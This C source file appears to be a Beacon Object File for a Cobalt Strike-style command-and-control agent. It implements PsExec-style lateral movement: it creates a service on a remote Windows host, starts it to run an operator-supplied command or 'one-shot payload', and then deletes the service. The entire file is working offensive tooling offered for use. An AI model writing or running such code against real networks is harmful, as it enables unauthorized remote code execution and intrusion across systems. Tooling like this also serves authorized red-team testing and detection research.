/*
 * BOF: PsExec-style Remote Service Execution
 *
 * Creates a service on a remote host, starts it (executing the supplied
 * command), then deletes it. Requires local-admin on the target.
 *
 * Compile: x86_64-w64-mingw32-gcc -c psexec.c -o psexec.o
 *
 * Arguments (packed via BeaconDataParse):
 *   [wchar*] target       - remote hostname or IP (e.g. \\DC01)
 *   [wchar*] service_name - name for the temporary service
 *   [wchar*] command      - binary path / command to execute
 */

#include <windows.h>
#include "../bof_api.h"

/* SCM API imports */
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(SC_HANDLE, LPCWSTR, LPCWSTR,
    DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR *);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    wchar_t *target       = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *service_name = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *command      = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!target || !service_name || !command) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: psexec <target> <service_name> <command>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Connecting to SCM on %S", target);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(target, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerW failed: %lu", KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating service '%S' -> %S", service_name, command);

    SC_HANDLE hSvc = ADVAPI32$CreateServiceW(
        hSCM,
        service_name,
        service_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        command,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "CreateServiceW failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting service '%S'", service_name);

    if (!ADVAPI32$StartServiceW(hSvc, 0, NULL)) {
        DWORD err = KERNEL32$GetLastError();
        /* ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected for one-shot commands */
        if (err != 1053) {
            BeaconPrintf(CALLBACK_ERROR, "StartServiceW failed: %lu", err);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Service started (timeout expected for one-shot payloads)");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started successfully");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Deleting service '%S'", service_name);

    if (!ADVAPI32$DeleteService(hSvc)) {
        BeaconPrintf(CALLBACK_ERROR, "DeleteService failed: %lu", KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service deleted");
    }

    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);
}
